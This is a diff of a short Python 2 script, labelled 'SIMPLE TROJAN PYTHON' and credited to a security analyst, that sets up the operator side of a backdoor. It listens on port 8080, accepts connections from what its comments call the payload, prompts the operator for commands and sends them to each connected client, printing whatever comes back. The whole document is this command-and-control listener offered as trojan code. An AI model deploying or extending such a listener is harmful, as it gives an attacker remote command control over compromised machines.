@@ -1,29 +1,35 @@
+##
+# SIMPLE TROJAN PYTHON 
+#@author - Jerome Themee - security analyst 
+#@date - 16/07/2015
+##
 import socket
 import threading
+# socket creation
+bind_ip = "0.0.0.0" 
+bind_port = 8080   
 
-bind_ip = "0.0.0.0" # local IP
-bind_port = 8080    # port that you're locking for
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+server.bind((bind_ip,bind_port))  
+server.listen(5)  
 
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creating object
-server.bind((bind_ip,bind_port))  #bind called 
-server.listen(5)  # 5 connections possible
-
+# listener from the payload
 print "[*] listening on %s:%d" %(bind_ip,bind_port) # say hi !
 
-# client handle thread
 def handle_client(client_socket):
+	#send back the packet 
+	response = raw_input("which command would you like ?\n")
+	client_socket.send(response)
 	#print the client data
 	request = client_socket.recv(2048)
-	
 	print "[*] Received: %s" % request
-	#send back the packet 
-	response = raw_input("which command command would you like to send ?\n")
-	client_socket.send(response)
-	#client_socket.close()
+	response = raw_input("which command would you like ?\n")
 
-while True: #loop for waiting connections
+#loop for waiting connections
+while True: 
 	client,addr = server.accept()
 	print "[*] Accepted connection from %s:%d" % (addr[0],addr[1])
-# threading started
+
+#threading started
 	client_handler = threading.Thread(target=handle_client,args=(client,))
 	client_handler.start()
